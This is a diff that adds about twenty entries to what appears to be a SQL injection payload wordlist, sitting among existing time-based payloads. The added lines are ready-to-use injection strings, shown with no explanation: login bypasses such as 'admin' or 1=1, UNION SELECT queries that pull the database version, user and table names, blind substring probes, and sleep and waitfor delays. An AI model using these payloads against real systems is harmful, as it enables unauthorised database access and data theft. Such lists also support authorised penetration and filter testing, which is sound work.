@@ -311,3 +311,24 @@ AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 '|| pg_sleep(10) --+
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+' and 'x'='x
+admin' or 1=1;-- 
+?id=1' order by 1 --+
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+'+||+1=1#
+')waitfor delay'0:0:10'--
+(select(0)from(select(sleep(10)))v)
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+%2b(select*from(select(sleep(10)))a)%2b
